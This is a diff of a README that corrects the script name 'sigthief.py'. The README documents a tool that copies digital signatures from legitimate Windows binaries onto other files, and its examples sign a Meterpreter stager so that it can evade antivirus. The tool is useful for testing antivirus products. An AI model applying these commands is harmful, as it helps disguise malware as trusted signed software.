@@ -20,7 +20,7 @@ I look forward to hearing about your results!
 
 ### Usage
 ```
-Usage: sigtheif.py [options]
+Usage: sigthief.py [options]
 
 Options:
   -h, --help            show this help message and exit
@@ -39,7 +39,7 @@ Options:
 
 ### Take a Signature from a binary and add it to another binary
 ```
-$ ./sigtheif.py -i tcpview.exe -t x86_meterpreter_stager.exe -o /tmp/msftesting_tcpview.exe 
+$ ./sigthief.py -i tcpview.exe -t x86_meterpreter_stager.exe -o /tmp/msftesting_tcpview.exe 
 Output file: /tmp/msftesting_tcpview.exe
 Signature appended. 
 FIN.
@@ -47,7 +47,7 @@ FIN.
 
 ### Save Signature to disk for use later
 ```
-$ ./sigtheif.py -i tcpview.exe -r                                                        
+$ ./sigthief.py -i tcpview.exe -r                                                        
 Ripping signature to file!
 Output file: tcpview.exe_sig
 Signature ripped. 
@@ -57,7 +57,7 @@ FIN.
 
 ### Use the ripped signature
 ```
-$ ./sigtheif.py -s tcpview.exe_sig -t x86_meterpreter_stager.exe                               
+$ ./sigthief.py -s tcpview.exe_sig -t x86_meterpreter_stager.exe                               
 Output file: x86_meterpreter_stager.exe_signed
 Signature appended. 
 FIN.
@@ -68,7 +68,7 @@ FIN.
 This has really interesting results actually, can help you find AVs that value Signatures over functionality of code. Unsign putty.exe ;)
 
 ```
-$ ./sigtheif.py -i tcpview.exe -T    
+$ ./sigthief.py -i tcpview.exe -T    
 Inputfile is signed!
 Output file: tcpview.exe_nosig
 Overwriting certificate table pointer and truncating binary
@@ -78,6 +78,6 @@ FIN.
 
 ### Check if there is a signature (does not check validity)
 ```
-$ ./sigtheif.py -i tcpview.exe -c
+$ ./sigthief.py -i tcpview.exe -c
 Inputfile is signed!
 ```
